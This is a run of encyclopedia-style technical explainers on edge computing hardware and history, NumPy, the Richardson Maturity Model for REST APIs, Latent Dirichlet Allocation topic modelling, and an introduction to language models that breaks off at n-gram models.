For the edge , RISC processors such as ARM , ARC , Tensilica , and MIPS are preferred over CISC .
While ARM Cortex is suitable , ARM also offers Neoverse specifically for edge use cases .
ARM Cortex - M55 and Ethos - U55 are AI edge computing chips .
NVIDIA Jetson GPUs are designed for the edge .
For example , the Jetson Nano has a 128-core GPU .
Jetson TX2 and Jetson Xavier are for industrial and robotic use cases .
There 's also the NVIDIA EGX Platform that offers GPU edge servers .
Intel has Movidius and Myriad 2 .
The latter is also part of Intel 's Neural Compute Stick ( NCS ) that draws power from the host device via USB .
Mainflux Labs offers MFX-1 IoT Edge Gateway .
Huawei 's Atlas AI Computing Platform of AI accelerators , edge stations and servers is based on its Ascend AI processors .
Scale Computing offers HC3 Edge and HE500 systems .
APC 's EcoStruxure Micro Data Centre promises physical security , standardized deployment , and remote cloud - based monitoring .
There are many more focusing on micro datacentres .
How are cloud providers enabling edge computing ?
Google uses TPUs in its datacentres .
In 2018 , it started offering Edge TPU , an ASIC for AI inferencing at the edge .
TensorFlow Lite models can run on an Edge TPU .
Microsoft 's Azure Stack Edge is a cloud - managed edge appliance with computer , storage and intelligence .
The processors are Intel Xeon .
For machine learning workloads , Intel Arria10 FPGA is the hardware accelerator .
AWS has a number of services for the edge .
AWS Outposts extends AWS infrastructure and services to any other datacentre or on - premise facility .
AWS Snow Family offers small portable rugged edge devices to be deployed as close as possible to sensors collecting data .
AWS Wavelength brings single - digit millisecond latencies to mobile devices and end users .
It does this by bringing AWS compute and storage to telecom datacentres at the edge of 5 G networks .
Mark Weiser at Xerox PARC coins the term Ubiquitous Computing .
Unlike desktop computing , the term implies that computing can happen on any device , in any location .
It can happen in laptops , mobile phones , sensor devices , and everyday objects such as refrigerators , umbrellas or alarm clocks .
In the late 1990s , a similar term , Pervasive Computing , was coined .
Illustration of a CDN with distributed edge servers .
Source : Fraser 2019 .
Akamai is incorporated " to intelligently route and replicate content over a large network of distributed servers .
" This is what we call a Content Delivery Network ( CDN ) .
Akamai delivered the first live traffic in February 1999 and launched commercial service in April .
Yahoo !
become one of their customers .
By 2019 , Akamai is said to have 240,000 edge servers , many of which are located in ISPs or mobile data towers .
A user request is served by the closest available edge server that also caches content .
Napster was launched as a file sharing software to download and distribute music .
The common way to download on the internet is to connect to a server and download files to the client machine .
Napster is a peer - to - peer ( P2P ) network in which machines are both clients and servers .
One machine can download parts of a file from another nearby machine .
This distributed architecture makes the P2P network scalable , faster and resilient to failures .
This idea of cooperative file sharing can be traced to USENET ( 1979 ) .
Amazon launches Amazon Web Services ( AWS ) .
Its Elastic Compute Cloud service enables users to use datacentre infrastructure to run programs .
The same year , Google Docs was launched .
Spreadsheets and documents can be edited and saved online .
This is the beginning of cloud computing .
However , Saleforce pioneered this model back in 1999 .
Cloudlet use cases , plus comparing cloudlet with cloud .
Source : Satyanarayanan et al .
2009 , fig .
4 .
Satyanarayanan et al .
coin the term cloudlet .
They recognize that network latency hurts user experience for highly interactive applications .
A response time of more than a second becomes annoying .
Mobile devices are also resource constrained and relying on the cloud is too slow .
Cloudlets are a solution .
They provide the computing power for nearby edge devices .
They connect to edge devices via low - latency , high - bandwidth one - hop wireless links .
Myoonet pioneers the concept of modular micro datacentres .
A year later , AOL followed this trend with indoor micro datacentres for enterprises .
With IoT in mind , and to handle real - time low - latency applications , Cisco engineers coin the term fog computing to imply a distributed cloud infrastructure .
Their paper is titled Fog Computing and Its Role in the Internet of Things .
Fog computing encompasses edge processing plus the network connections that bring data from the edge to the cloud .
In 2015 , the OpenFog Consortium was founded .
In 2019 , it will merge with the Industrial Internet Consortium .
Comparing performance on edge device , edge servers and AWS datacentres .
Source : Ha et al .
2013 , figs .
9 - 10 .
Ha et al .
note the emergence of new resource - intensive interaction - intensive applications : face recognition , speech recognition , object and pose identification , mobile augmented reality , and physical simulation and rendering .
In their experiments , they found that face recognition can be done on an average server one hop away from the edge device .
But speech recognition is more intensive and will need cloud processing unless the edge server is upgraded .
The First IEEE / ACM Symposium on Edge Computing was organized in Washington DC .
In May 2017 , there will be the IEEE International Conference on Fog and Edge Computing in Madrid , Spain .
In June 2017 , there will be the IEEE International Conference on Edge Computing in Hawaii .
These events highlight the growing interest in edge computing .
Predicted value of edge computing by 2025 .
Source : Chabas et al .
2018 , fig .
1 .
In 2019 , Gartner research shows that only 10 % of enterprise data was created and processed outside cloud infrastructure .
They predict that by 2025 this will increase to 75 % .
This underscores the importance of edge computing .
In other research , McKinsey estimates the value of edge computing to be $ 175-$215 billion by 2025 .
NumPy logo .
Source : Cournapeau 2018 , BSD license .
NumPy is an open source Python library that enables efficient manipulation of multi - dimensional numerical data structures .
These are called arrays in NumPy .
NumPy is an alternative to Interactive Data Language ( IDL ) and MATLAB .
Since its release in 2005 , NumPy has become a fundamental package for numerical and scientific computing in Python .
In addition to efficient data structures and operations on them , it provides many high - level mathematical functions that aid scientific computation .
Pandas , SciPy , Matplotlib , scikit - learn and scikit - image are just a few popular scientific packages that make use of NumPy .
What does NumPy do differently from core Python ?
Comparing storage of Python list and NumPy array .
Source : UCF 2020 .
Python is slower than compiled languages such as C , but it 's easy to learn .
Python is suited for rapid prototyping and iterative development .
While Python 's ` list ` data type can be used to construct multi - dimensional data structures ( lists containing lists ) , NumPy is faster and provides a better API for developers .
Python 's lists are general purpose .
They can contain data of different types .
This means that types are also stored , type - dispatching code is invoked at runtime and types are checked .
Lists are processed using loops or comprehensions and ca n't be vectorized to support elementwise operations .
NumPy sacrifices some of Python 's flexibility to improve performance .
Specifically , NumPy is better at these aspects : Size : NumPy data structures take up less space .
Each Python integer object takes 28 bytes , whereas in NumPy an integer is just 8 bytes .
A Python list of ` n ` items requires ` 64 + 8n+28n ` bytes whereas in NumPy it 's ` 96 + 8n ` bytes .
Performance : NumPy code runs faster than Python code , particularly for large input data .
Functionality : NumPy provides lots of functions and methods to simplify operations .
High - level operations such as linear algebra are also included .
What are some of the main features of NumPy ?
An example shows at most four elements loaded into registers and processed in parallel .
Source : Konrad 2018 .
NumPy arrays are homogeneous , meaning that array elements are of the same type .
Hence , no type checking is required at runtime .
All elements of an array take up the same amount of space .
The spacing between elements along an axis is also constant .
This is called striding .
This is useful when the same data in memory can be used to create a new array without copying .
Different arrays are therefore different views into memory .
Thus , it 's easier to modify data subsets in memory .
Operations are vectorized , which means that the operation can be executed in parallel on multiple elements of the array .
This speeds up computation .
Developers need not write ` for ` loops .
NumPy provides APIs for easy manipulation of arrays .
Some of these are indexing , slicing , reshaping , stacking and splitting .
Broadcasting is a feature that allows operations between vectors and scalars , or vectors of different sizes .
NumPy integrates easily with C / C++ or Fortran code that may provide optimized implementations .
Useful functions covering linear algebra , Fourier transform , and random numbers are provided .
Could you share some performance numbers comparing NumPy versus Python implementations ?
Comparing performance of pure Python , NumPy , Cython and C. Source : Ross 2014 .
For a simple computation of mean and standard deviation of a million floating point numbers , NumPy was 30X faster than a pure Python implementation .
However , optimized Cython and C implementations were even faster .
Another study showed that if the input is small ( less than 200 numbers ) , pure Python did better than NumPy .
For inputs greater than about 15,000 numbers , NumPy outperformed C++ .
One experiment in Machine Learning compared pure Python , NumPy and TensorFlow ( on CPU ) implementations of gradient descent .
The Runtimes were 18.65 , 0.32 and 1.20 seconds respectively .
NumPy was 50X faster than pure Python .
For more complex ML problems deployed on multiple GPUs , TensorFlow is likely to outperform NumPy .
When evaluating NumPy performance , the underlying library for vector / matrix computations matters .
NumPy comes with Default BLAS & Lapack .
Depending on the distribution , alternatives may be included : OpenBLAS , Intel MKL , ATLAS , etc .
In general , these alternatives are faster than the default library .
For example , SVD is 10X faster on Intel MKL .
Hardware platforms may provide further acceleration .
For example , Intel AVX2 provides at least 20 % improvement on top of OpenBLAS .
Does NumPy automatically make use of GPU hardware ?
NumPy does n't necessarily support GPUs .
However , there are tools and libraries to run NumPy on GPUs .
Numba is a Python compiler that can compile Python code to run on multicore CPUs and CUDA - enabled GPUs .
Numba also understands NumPy and generates optimized compiled code .
Developers specify type signatures for Python functions .
Numba uses them for just - in - time ( JIT ) compilation .
Numba team also provides ` pyculib ` , which is a Python interface for CUDA libraries such as cuBLAS , cuFFT and cuRAND .
Grumpy has been proposed as a framework to seamlessly target multicore CPUs and GPUs .
It does a mix of JIT compilation and offloading to optimized libraries such as cuBLAS or LAPACK .
CuPy is a Python library that implements NumPy arrays for CUDA - enabled GPUs and leverages CUDA GPU acceleration libraries .
The code is mostly a drop - in replacement for NumPy code since the APIs are very similar .
PyCUDA is a similar library from NVIDIA .
MinPy is similar to CuPy and is meant to be a NumPy interface above MXNet for building artificial neural networks .
It includes auto differentiation in addition to transparent CPU / GPU acceleration .
What are some essential resources to learn NumPy ?
The main NumPy website is the definitive resource to consult .
Beginners can start by reading their Quickstart tutorial or the absolute beginner 's guide .
The latter includes the basics of installing NumPy .
Rougier 's book , titled From Python to Numpy , focuses on Python programmers who wish to learn NumPy and its vectorization .
Perhaps a classic is the PhD thesis titled Guide to NumPy , by Travis E. Oliphant , who created NumPy .
MATLAB users might want to read NumPy for Matlab users .
It maps MATLAB operations to NumPy equivalents .
DataCamp blog has shared a handy NumPy cheatsheet .
Those who wish to contribute to the NumPy project or study its source code can head to NumPy 's GitHub repository .
Numeric has been released to enable numerical computations .
It 's designed to provide homogeneous numeric arrays , that is , arrays whose elements all belong to the same data type , and therefore easier and faster to process .
NumPy is released based on an older library named Numeric .
It also combines features of another library named Numarray .
NumPy was initially named SciPy Core but renamed NumPy in January 2006 .
NumPy v1.0 has been released .
NumPy v1.3.0 has been released .
This release includes experimental Windows 64-bit support .
Support for 64-bit OpenBLAS comes a decade later in December 2019 .
NumPy v1.5.0 has been released .
This is the first release to support Python 3 .
GitHub publishes a study of Machine Learning ( ML ) projects hosted on their platform .
The study spans contributions from Jan - Dec 2018 .
It 's seen that 74 % of ML Python projects import NumPy .
This is followed by SciPy and Pandas .
NumPy v1.17.0 has been released .
This release supports Python 3.5 - 3.7 but drops support for Python 2.7 .
In fact , NumPy v1.16.x is the last series to support Python 2.7 but being a long term release , v1.16.x will be maintained till 2020 .
NumPy v1.16.6 be released in December 2019 .
Daily downloads of NumPy of Python 2 and 3 for Nov2019-Apr2020 .
Source : PyPI Stats 2020 .
Following the end of Python 2 in January 2020 , the number of downloads for older NumPy releases based on Python 2 has fallen sharply .
By April 2020 , 80 % of NumPy downloads will be based on Python 3 .
Richardson Maturity Model .
Source : Sandoval .
2018 .
Consider remote web servers as huge repositories of data .
Client applications can access them via APIs .
It could be public data such as weather forecasts , stock prices , or sports updates .
Data could be private , such as company - specific business information that 's accessible to employees , vendors or partners .
REST ( REpresentational State Transfer ) is a popular architectural style for designing web services to fetch or alter remote data .
APIs conforming to the REST framework are considered more mature because they offer ease , flexibility and interoperability .
The Richardson Maturity Model ( RMM ) is a four - level scale that indicates the extent of API conformity to the REST framework .
The maturity of a service is based on three factors in this model : URI , HTTP Methods and HATEOAS ( Hypermedia ) .
If a service employs these technologies , it ’s considered more mature .
This model covers only the API architectural style , not data modeling or other design factors .
What are the different levels in the Richardson Maturity Model ?
RMM has four levels of maturity , from the lowest to highest : Level-0 : Swamp of POX : Least conforming to REST architecture style .
Usually , expose just one URI for the entire application .
It uses HTTP POST for all actions , even for data fetch .
SOAP or XML - RPC - based applications come under this level .
POX stands for Plain Old XML .
Level-1 : Resource - Based Address / URI : These services employ multiple URIs , unlike in Level 0 .
However , they use only HTTP POST for all operations .
Every resource is identifiable by its own unique URI , including nested resources .
This resource - based addressing can be considered the starting point for APIs being RESTful .
Level-2 : HTTP Verbs : APIs at this level fully utilize all HTTP commands or verbs such as GET , POST , PUT , and DELETE .
The request body does n’t carry the operation information at this level .
The return codes are also properly used so that clients can check for errors .
Level-3 : HyperMedia / HATEOAS : Most mature level that uses HATEOAS ( Hypertext As The Engine Of Application State ) .
It 's also known as HyperMedia , which basically consists of resource links and forms .
Establishing connections between resources becomes easy as they do n’t require human intervention and aids client - driven automation .
Could you illustrate the RMM levels with an example ?
Consider the example of creating , querying , and updating employee data , which is included in the Sample Code section .
At Level 0 , an employee 's last name would be used to get employee details .
Though just a query , HTTP GET is not used instead of HTTP POST .
A response body would need to be searched to obtain the employee details .
If there 's more than one employee with the same last name , multiple records are returned in proprietary format .
At Level 1 , specificity is improved by querying with employee ID rather than with last name .
Each employee is uniquely identifiable .
This implies that each employee has a unique URI , and therefore , is a uniquely addressable resource in REST .
While Level 1 uses only POST , Level 2 improves upon this design by using all the HTTP verbs .
Query operations use GET , update operations use PUT and add operations use POST .
This also ensures the sanctity of employee data .
Appropriate error codes are returned at the HTTP protocol layer .
This implies that we do n't need to dig into the response body to figure out errors .
At Level 3 , response about an employee includes unique hyperlinks to access that employee 's records .
What are the characteristics of RMM Level 0 ?
RMM level 0 is equivalent to using SOAP .
Source : Lithmee 2018 .
An API at this level usually consists of functions passing the server object and the name of the interface to the server object .
This is sent to the server in XML format using the HTTP post method .
The server analyses the request and sends the result to the client , also in XML .
If the operation fails , some sort of error message will be in the reply body .
At Level 0 , you can do an actual object transfer between the client and server , not just its representation state ( as in REST ) .
Object data can be in standard formats ( JSON , YAML , etc .
) or in custom formats .
If it ’s SOAP , the specifications are in an accompanying WSDL file .
HTTP is used in a very primitive manner , just as a tunnelling mechanism for the client ’s own remote operations .
For that matter , other application layer protocols such as FTP or SMTP can also be used .
What are the characteristics of RMM Level 1 ?
Level 1 employs several URIs , each of which leads to a specific resource and acts as an entry point to the server side .
This aspect is common with Levels 2 and 3 .
Requests are delivered to the specific resource in question , rather than simply exchanging data between each individual service endpoint .
While this seems like a small difference , in terms of function it ’s a critical change .
The identity of specific objects is established and invoked .
Only arguments related to its function and form are passed to each object / resource .
From this level onwards , it is always HTTP as the application layer protocol .
The key non - conformity to REST at this level is disregarding the semantics of HTTP .
Only HTTP POST is used for all CRUD ( Create , Read , Update , Delete ) operations .
The return status and data retrieved are all in the body of the HTTP response .
What are the characteristics of RMM Level 2 ?
The emphasis at this level is on the correct usage of the various HTTP verbs , especially the use of GET and POST commands .
By restricting all fetch operations to GET , an application can guarantee safety and sanctity of the data on the server side .
Caching of data at the client side for quicker access has become possible too .
The model calls this level HTTP Verbs .
It implies that only HTTP can be used .
Actually , the REST architectural pattern does n't mandate the use of HTTP .
It 's entirely protocol neutral .
On the server side , the 200 series of HTTP response codes should be used properly to indicate success , and the 400 series to represent different types of error .
Taken together , levels 1 and 2 clarify at a high level ( such as in server logs ) what resources are being accessed , for what purpose , and what happened .
The non - conformity here is quite subtle .
The API at this level lacks the transparency for the client to navigate the application state without some external knowledge , generally present in supplied documentation .
What are the characteristics of RMM Level 3 ?
In order to ensure complete conformance to RESTful architecture , the final hurdle is to provide smooth navigation for the client throughout the application .
This is supported through Hypermedia controls .
The HTTP responses include one or more logical links to the resources that the API accesses .
That way , the client does n’t have to rely on external documentation to interpret the content .
Because the responses are self - explanatory , it encourages easy discoverability .
This is done using HATEOAS ( Hypertext as the Engine of Application State ) , which forms a dynamic interface between the server and client .
One obvious benefit is that it allows the server to change its URI scheme without breaking clients .
As long as the client - facing URI is maintained intact , the server can juggle around its resources and contents internally without impacting the client .
Service updates in the application become seamless without service disruption .
It also allows the server team to inform the client of new features by putting new links in the responses that the client can discover .
What sort of applications can still be designed with Level 0 or Level 1 APIs ?
Plenty of online services belong to RMM Level 0 or 1 , such as Google Search Service ( now deprecated ) and Flash - based websites .
However , these are slowly being phased out .
If you are designing a monolithic service that performs only one major function , then probably a Level 0 API would suffice as there is no need for multiple URIs .
Level 0 is adequate for a service of short - term purpose that 's not meant to be extended or upgraded .
Think of an exam result declaration website as an example .
Its use is restricted to a few days when the results are out .
After that , it would just become inactive and irrelevant .
There is just one function that the web service performs : it returns an individual student ’s pass / fail state .
If a few resources are to be accessed , then Level 1 can be employed .
In cases where HTTP is not desired as the transport mechanism , then Level 0 APIs written using SOAP can work even with alternatives like FTP or SMTP .
When does it become necessary to have APIs designed at Level 2 or Level 3 ?
Web products and solutions are increasingly being deployed using the SaaS distribution model .
To support this , design and manufacturing models are also service - oriented ( SOA ) .
They are exposed as microservices , a loosely coupled collection of services .
Popular cloud - based subscriptions such as mobile services , streaming web content , office automation products are all deployed in this fashion .
Such services are essentially designed with APIs conforming to the Levels 2 and 3 of the model .
Applications choose Level 2 or 3 due to some additional factors – ( 1 ) Need to work even with limited bandwidth and computing resources ( 2 ) Rely on caching for greater performance ( 3 ) Stateless operations Lower level APIs like SOAP can be compared to an envelope .
It has content inside , addresses written outside .
Content is obscured from public view .
However , higher levels that conform to REST are like a postcard .
The entire content is directly visible .
Though this aspect brings a lot of transparency and discoverability , there is a security threat perception associated with the data .
Applications take care of this aspect using security features such as in the Spring framework .
What are the other models used to judge the design standards of remote application interfaces ?
The Richardson Maturity Model classifies applications with varying levels of API maturity based on conformance to the REST framework .
There is another model called the Amundsen Maturity Model , which classifies APIs based on their data model abstraction .
At higher levels of this model , the API is more decoupled from the internal models or implementation details .
Dave Winer introduces XML - RPC , a lightweight rival to SOAP .
SOAP development is held up due to several disagreements .
Hence , XML - RPC comes out first .
About this time ( February 1998 ) , W3C released XML Version 1.0 .
Simple Object Access Protocol ( SOAP ) , originally developed by Microsoft , becomes a W3C recommendation .
It marks the beginning of web services between clients and remote web servers .
SOAP is widely adopted by most emerging companies , like Salesforce , Ebay and Yahoo .
RESTful architecture .
Source : Vincy 2019 .
Roy Fielding , unhappy with SOAP implementation , came up with a protocol - neutral architectural style called REST .
This is published as his PhD dissertation at UC Irvine .
REST is just a set of design principles at this stage .
Amazon S3 , a file hosting service , releases APIs with support for URI and HTTP verbs .
But the design does n't provide resource links .
Instead , resources are marked by unique key - value pairs .
Adobe , Netflix and some other major service providers adopt web service design , supporting hypermedia links in their responses .
This open API design is greatly appreciated .
After analysing hundreds of web service designs , Leonard Richardson came up with a model that helps to distinguish between good and bad designs .
His yardstick is purely based on API maturity .
This model is popularly referred to as the Richardson Maturity Model ( RMM ) .
News aggregators and media companies like The Guardian and Wall Street Journal upgrade their web services for better REST conformity .
Now their services are compliant with Level 3 of the Richardson Maturity Model , with hypermedia controls .
Compliance of APIs with best practices and maturity levels of API providers .
Source : Rodríguez et al .
2016 , fig .
4 .
Rodríguez et al .
publish results of a study on HTTP traffic from an Italian mobile internet provider 's network .
They note most APIs conform to RMM Level 2 , implying a focus on providing CRUD access to individual resources .
Even when some APIs are at higher levels of maturity , there 's wide variation in the adoption of best practices .
For example , the use of trailing forward slash in URI is not recommended .
Use of lowercase and hyphens ( rather than underscores ) in URI is recommended .
Adobe released a Hypermedia driven UI framework for remote web services called Granite UI .
Granite UI is an umbrella name for UI projects to build a LEGO ® architecture for UI , so that one can build complex web applications with much less code .
Graphical representation of LDA with annotations .
Source : Hong 2018 .
Given a document , topic modelling is a task that aims to uncover the most suitable topics or themes that the document is about .
It does this by looking at words that most often occur together .
For example , a document with high co - occurrence of the words ' cats ' and ' dogs ' is probably about the topic ' Animals ' , whereas the words ' horses ' and ' equestrian ' are partly about ' Animals ' but more about ' Sports ' .
Latent Dirichlet Allocation ( LDA ) is a popular technique to do topic modelling .
LDA is based on probability of distributions .
For each document , it considers a distribution of topics .
For each topic , it considers a distribution of words .
This information helps LDA discover the topics in a document .
LDA and its many variants support diverse applications .
LDA is well - supported in a few programming languages and software packages .
What are the shortcomings of earlier topic models that LDA aims to solve ?
Before LDA , there were LSA and pLSA models .
LSA was simply a dimensionality reduction technique and lacked a strong probabilistic approach .
pLSA remedied this by being a probabilistic generative model .
It picked a topic with probability P(z ) .
Then it selected the document and the word with probabilities P(d|z ) and P(w|z ) respectively .
While LSA could model synonymy well , it failed in polysemy .
In other words , a word with multiple meanings needed to appear in multiple topics but did n't .
pLSA partially handled polysemy .
However , pLSA ignored P(d ) .
Each document was a mixture of topics , but there was no model to generate this mixture .
This made pLSA grow linearly as the corpus size increased , leading to overfitting .
Also , pLSA was unable to assign topic probabilities to new documents .
LDA is inspired by pLSA .
Like pLSA , it 's also a probabilistic generative model .
Unlike pLSA , LDA also considers the generation of documents .
This is where the Dirichlet distribution becomes useful .
It determines the topic distribution for each document .
Could you describe some example applications where LDA has been applied ?
LDA uncovers four main topics connected to user IDs on a school blog .
Source : Kuang 2017 .
LDA is an algorithm or method for topic modelling , which has been applied in information retrieval , text mining , social media analysis , and more .
In general , topic modelling uncovers hidden structures or topics in documents .
LDA has been applied in diverse tasks : automatic essay grading , anti - phishing , automatic labelling , emotion detection , expert identification , role discovery , sentiment summarization , word sense disambiguation , and more .
For analysing political texts , the LDA - based model was used to find opinions from different viewpoints .
In software engineering , LDA was used to find similar code in software repositories and suggest code refactoring .
Another study made use of geographic data and GPS - based documents to discover topics .
LDA has been used on online or social media data .
By applying it to public tweets or chat data , we can detect and track how topics change over time .
We can identify users who follow similar distribution of topics .
On Yelp restaurant reviews , LDA was used to do aspect - based opinion mining .
LDA was used on a school blog to uncover main topics and who 's talking about them .
Why is LDA called a generative model ?
LDA generates the document one word at a time .
Source : Ganegedara 2018 .
In a generative model , observations are generated by latent variables .
Given the words of a document , LDA figures out the latent topics .
But as a generative model , we can think of LDA as generating the topics and then the words for that document .
In the figure , we note that \(\alpha\ ) fixes a particular distribution of topics \(\theta\ ) .
There 's one such distribution for each document .
For a document , when we pick a topic from this distribution , we 're faced with word distribution \(\beta_i\ ) for that topic .
These word distributions are determined by \(\eta\ ) .
From our topic 's word distribution , we pick a word .
We do this as many times as the document 's word count .
Thus , the model is generative .
What 's the significance of Dirichlet prior to LDA ?
Effect of α on topic distribution of three topics .
Source : Ganegedara 2018 .
Topic distribution \(\theta\ ) and word distribution \(\beta\ ) are created from \(\alpha\ ) and \(\eta\ ) respectively .
The latter are called Dirichlet priors .
A low \(\alpha\ ) implies a document might have fewer dominant topics .
A large \(\alpha\ ) implies many dominant topics .
Similarly , a low ( or high ) \(\eta\ ) means a topic has a few ( or many ) dominant words .
Given the Dirichlet distribution \(Dir(\alpha)\ ) we sample a topic distribution for a specific document .
Likewise , from \(Dir(\eta)\ ) we sample a word distribution for a specific topic .
In other words , the Dirichlet distribution generates another distribution .
For this reason , it 's called distribution over distribution .
Suppose we have k topics and a vocabulary V. \(\alpha\ ) will be a vector of length k. \(\eta\ ) will be a vector of length V. If all elements of the vector have the same value , we call this symmetric Dirichlet distribution .
It simply means we have no prior knowledge and assume all topics or words are equally likely .
In this case , the prior may be expressed as a scalar , called concentration parameter .
In an alternative terminology , the \(\eta\ ) symbol is not used .
\(Dir(\beta)\ ) generates \(\phi\ ) .
What are the methods of inference and parameter estimation under LDA ?
In LDA , words are observed , topic and word distributions are hidden , and \(\alpha\ ) and \(\eta\ ) are the hyperparameters .
Thus , we need to infer the distributions and the hyperparameters .
In general , this problem is intractable .
The two distributions are coupled in the latent topics .
We note three common techniques for inference and estimation : Gibbs Sampling : A method for sampling from a joint distribution when only conditional distributions of topics and words can be efficiently computed .
Expectation - Maximization ( EM ) : Useful for parameter estimation via maximum likelihood .
Variational Inference : Coupling between distributions is removed to yield a simplified graphical model with free variational parameters . Now we have an optimization problem to find the best variational parameters .
Kullback - Leibler ( KL ) divergence between the variational distribution and the true posterior can be used .
What 's the typical pipeline for doing LDA ?
Text preprocessing with NLTK and aspect extraction using LDA via Spark MLlib .
Source : Tanna 2018 .
The actual work of LDA is iterative .
It starts by randomly assigning a topic to each word in each document .
Then the topic and word distributions are calculated .
These distributions are used in the next iteration to reassign topics .
This is repeated until the algorithm converges .
Once the distribution is worked out during training , the dominant topics of a test document can be identified by its location in the topic space .
Suppose a document has only a few topics .
Suppose a topic has only a few highly likely words .
These two goals are at odds with each other .
By trading off these two goals , LDA uncovers tightly co - occurring words .
Could you describe some variants of the basic LDA ?
A summary of some LDA variants for the period 2003 - 2016 .
Source : Jelodar et al .
2018 , fig .
1 .
While LDA looks at co - occurrences of words , some LDA variants include metadata such as research paper authors or citations .
Another approach is to look at word sequences with Markov dependencies .
For social network analysis , the Author - Recipient - Topic model conditions the distribution of topics between the sender and one recipient .
For applications such as automatic image annotation or text - based image retrieval , Correspondence LDA models the joint distribution of images and text , plus the conditional distribution of the annotation given the image .
The Correlated Topic Model captures correlations among topics .
Word co - occurrence patterns are rarely static .
For example , " dynamic systems " more recently co - occur with " graphical models " more than " neural networks " .
Topics over Time models time jointly with word co - occurrences .
It uses continuous distribution over time .
LDA does n't differentiate between topic words and opinion words .
Opinions can also come from different perspectives .
The Cross - Perspective Topic model extends LDA by separating opinion generation from topic generation .
Nouns form topics .
Adjectives , verbs and adverbs form opinions .
Jelodar et al ( 2018 ) notes many more variants .
What are some resources for working with LDA ?
In Python , nltk is useful for general text processing while gensim enables LDA .
In R , quanteda is for quantitative text analysis while topicmodels are more specifically for topic modelling .
In Java , there 's Mallet , TMT and Mr .
LDA .
Gensim has a useful feature to automatically calculate the optimal asymmetric prior to \(\alpha\ ) by accounting for how often words co - occur .
LDA is built into the Spark MLlib .
This can be used via Scala , Java , Python or R. For example , in Python , LDA is available in the module ` pyspark.ml.clustering ` .
There are plenty of datasets for research into topic modelling .
Those labelled with categories or topics may be more useful .
Some examples are Reuters-21578 , Wiki10 + , DBPL Dataset , NIPS Conference Papers 1987 - 2015 , and 20Newgroups .
Deerwester et al .
apply Singular Value Decomposition ( SVD ) to the problem of automatic indexing and information retrieval .
SVD brings together terms and documents that are closely related in the " semantic space " .
Their idea of semantics is nothing more than a topic or concept .
They call their method Latent Semantic Indexing ( LSI ) or Latent Semantic Analysis ( LSA ) .
The pLSA model .
Source : Blei 2013 , slide 10 .
Hofmann presents a statistical analysis of LSA .
He coins the term Probabilistic Latent Semantic Analysis ( pLSA ) .
It 's based on the aspect model , which is a latent variable model .
It associates unobserved class variables ( topics ) with each observation ( words ) .
Unlike LSA , this is a proper generative model .
The LDA model .
Source : Ruozzi 2019 , slide 12 .
First presented at the NIPS 2001 conference , Blei et al .
describe in detail a probabilistic generative model that they name Latent Dirichlet Allocation ( LDA ) .
They note that pLSA lacks a probabilistic model at the document level .
LDA overcomes this .
Their work uses the bag - of - words model , but they note that LDA can be applied to larger units such as n - grams or paragraphs .
Comparison of three LDA - based models for automated image captioning .
Source : Blei and Jordan 2003 , fig .
6 .
Blei and Jordan consider the problems of automated image captioning and text - based image retrieval .
They study three hierarchical probabilistic mixture models .
They arrive at Correspondence LDA ( CorrLDA ) that gives the best performance .
Typically , symmetric Dirichlet priors are used in LDA .
Wallach et al .
study the effect of structured prior to topic modelling .
They find that asymmetric Dirichlet priors over document - topic distributions is much better than symmetric priors .
To use asymmetric priors over topic - word distributions has little benefit .
The resulting model is less sensitive to the number of topics .
With hyperparameter optimization , computation can be made practical .
Related research with similar results was reported in 2018 by Syed and Spruit .
Word2vec came out in 2013 .
It 's a word embedding that 's constructed by predicting neighbouring words given a word .
LDA , on the other hand , looks at words at the document level .
Moody proposes lda2vec as an approach to capturing both local and global information .
This combines the power of word2vec and the interpretability of LDA .
Word vectors are dense but document vectors are sparse .
Language models probabilistically predict the next word based on previous words .
Source : Phy 2019 , fig .
1 .
Consider the phrase " I am going _ " .
If we analyse large amounts of English text , the missing word is more likely to be ' home ' rather than ' house ' .
This also implies that we can obtain the probability of a sequence of words .
A Language Model ( LM ) captures the probability of a sequence of words in the language .
Equivalently , it tells us how likely a given word will follow a sequence of words .
Traditionally , N - gram models and their variants were used as language models .
Since the early 2010s , Neural Language Models ( NLMs ) have been researched .
By 2019 , pre - trained LMs will be used for transfer learning to improve the performance of many downstream NLP tasks .
Why do we need a language model when languages have well - defined grammar ?
While natural languages have grammar , they also have a huge vocabulary .
There 's also considerable flexibility in how words can be combined .
Ambiguities occur naturally in human communication .
Usage also changes with time .
The end result is that grammatical rules and syntactic structures ca n't be specified for all use cases .
Language models therefore attempt to learn the " structure " of the language by analysing vast amounts of text .
The approach is statistical rather than being based on brittle rules .
In some sense , language models capture language syntax , semantics and even common sense knowledge .
While we commonly speak of a word sequence for language modelling , we can abstract the idea to a sequence of tokens .
A token could be a sentence , a phrase , a word , an n - gram , morpheme , or letter .
Where lemmatization is used , multiple surface forms are reduced to a single token .
An LM specifies its method of tokenization .
What are some applications of language models ?
Predictive text applications use LM .
Source : Rathore 2018 .
Language models are useful in applications that deal with text generation .
Some examples are optical character recognition , handwriting recognition , speech recognition , machine translation , spelling correction , image captioning , and text summarization .
In speech recognition , the phrases " no eye deer " and " no idea " may sound similar .
In spelling correction , " fill the from " may show no spelling errors , but in fact " fill the form " is the correct phrase .
In both these examples , an LM selects the more probable phrase .
In machine translation , LM can tell that " high winds tonight " is a better translation than " large winds tonight " .
Gmail 's Smart Reply , which suggests short responses to emails , relies on an LM .
In healthcare , LMs were shown to obtain generic representations from data of all patients .
This led to better prediction models .
LMs have been used for paraphrasing text .
Language modelling tasks themselves ( such as predicting a word given surrounding words ) have been useful in obtaining efficient word embedding .
These embeddings help represent words at the input of a neural network model .
Which are the main approaches to language modelling ?
There are two broad categories of language models : Count - based : These are traditional statistical models such as n - gram models .
Word co - occurrences are counted to estimate probabilities .
Variants of n - gram models have also been proposed .
Clustering models attempt to exploit similarities between words .
Caching models exploit the fact that once a word is used , it 's likely to appear again in that text .
Sentence mixture models build different models for different sentence types .
Continuous - space : These use neural networks .
They use word embeddings as dense word representations in a real - valued vector space .
Words that are semantically similar are typically close together in the vector space .
Such embeddings solve the data sparsity problem of n - gram models .
Unlike n - gram models , these scales well as vocabulary size increases .
Could you briefly describe n - gram models ?
Trigram counts and estimated word probabilities .
Source : Koehn 2009 , slide 5 .
Suppose a sentence S has N words , \(w_1 ... w_N\ ) .
Since LM is about finding the probability of S , this is a joint probability measure over all N words .
Typically , this is decomposed into a product of conditional probabilities \(P(S)=\prod_{i=1}^N P(w_i|w_1, ... ,w_{i-1})\ ) , where each term is a probability of a word given the previous words in the sentence .
To simplify the problem , we apply the Markov assumption .
